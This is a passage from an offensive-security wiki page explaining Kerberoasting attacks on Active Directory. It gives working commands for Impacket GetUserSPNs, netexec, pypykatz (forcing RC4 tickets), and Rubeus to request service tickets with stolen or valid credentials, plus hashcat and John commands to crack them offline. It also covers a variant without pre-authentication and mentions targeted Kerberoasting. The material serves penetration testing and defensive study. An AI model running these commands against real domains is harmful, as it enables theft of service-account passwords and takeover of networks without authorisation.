## Theory
When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (sname) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.

Multiple formats are accepted for the sname field: servicePrincipalName (SPN), sAMAccountName (SAN), userPrincipalName (UPN), etc

The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline
## Expoit
!!! note
    Kerberoast need a valid credential in domain
=== "UNIX-like"
    The Impacket script GetUserSPNs (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials
    ```bash
    # with a password
    GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

    # with an NT hash
    GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
    ```
    Netexec can also achieved this
    ```bash
    netexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
    ```
    Using pypykatz (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack $krb5tgs$23 takes less time than for krb5tgs$18.
    ```bash
    pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
    ```
=== "Windows"
    Rubeus (C#) can be used for that purpose.
    ```bash
    Rubeus.exe kerberoast /outfile:kerberoastables.txt
    ```

Hashcat and JohnTheRipper can then be used to try cracking the hash.
```bash
hashcat -m 13100 kerberoastables.txt $wordlist
```
```bash
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```
### Kerberoast w/o pre-authentication
If an attacker knows of an account for which pre-authentication isn't required (i.e. an ASREProastable account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).
=== "UNIX-like"
    The Impacket script GetUserSPNs (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials
    ```bash
    GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
    ```
=== "Windows"
    Rubeus (C#) can be used for that purpose.
    ```bash
    Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"DOMAIN.LOCAL" /dc:"DC01.DOMAIN.LOCAL" /nopreauth:"nopreauth_user" /spn:"target_service"
    ```
### Targeted Kerberoasting
If an attacker controls an account with the rights to add an SPN to another (`GenericAll`, `GenericWrite`), it can be abused to make that other account vulnerable to Kerberoast (see exploitation).